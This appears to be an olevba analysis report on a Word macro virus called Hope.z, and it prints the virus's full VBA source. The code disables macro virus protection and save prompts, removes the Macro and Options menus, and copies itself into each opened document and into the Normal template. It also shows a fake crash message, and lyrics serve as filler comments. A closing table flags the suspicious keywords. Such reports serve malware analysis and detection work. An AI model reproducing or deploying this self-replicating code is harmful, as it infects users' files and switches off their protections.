olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'29/12/99 09:49:11Kyocera FS-600 on LPT1:Wycombe Reference Librarysdjw3456ot76 weor9w5834958329/12/99 09:49:11
Sub ViewVBCode()
'29/12/99 09:49:11Kyocera FS-600 on LPT1:Wycombe Reference Librarysdjw3456ot76 weor9w5834958329/12/99 09:49:11
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'29/12/99 09:49:11Kyocera FS-600 on LPT1:Wycombe Reference Librarysdjw3456ot76 weor9w5834958329/12/99 09:49:11
End Sub
'MV Version 1e


Private Sub Document_Open(): Document_Close: End Sub
'withered rope you hang what's empty can't remain to put it simply
Private Sub Document_Close(): On Error Resume Next
'in time cry the hollow words to sing with false disguise smothered
Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2)
'hope fly from sorrow for a new divine tomorrow i just don't want
CommandBars("Tools").Controls("Macro").Delete: CommandBars("Tools").Controls("Options...").Delete
'to know anymore life shifts up and down everybody knows it's wrong
Set CM = MacroContainer.VBProject.VBComponents.Item(1).CodeModule
'why don't you care? now do it seem fair? it's not in the rhyme or
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'reason so it goes with every season crawl to top fall through
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'bottom first hand love is really rotten slice of life find what's
MC = CM.Lines(1, CM.CountOfLines)
'plenty inch towards a sanctuary light with me inside the womb i
ad.deletelines 1, ad.CountOfLines: ad.AddFromString MC
'know everyone everybody knows it's me it's my voice, my voice
nt.deletelines 1, nt.CountOfLines: nt.AddFromString MC
'cries out obscenity sightless eye regard my past sometimes it
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'should i just don't want to know anymore.
End Sub
'NoHope~By~Lys~KovicK Lyrics From Smothered Hope(Skinny Puppy)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

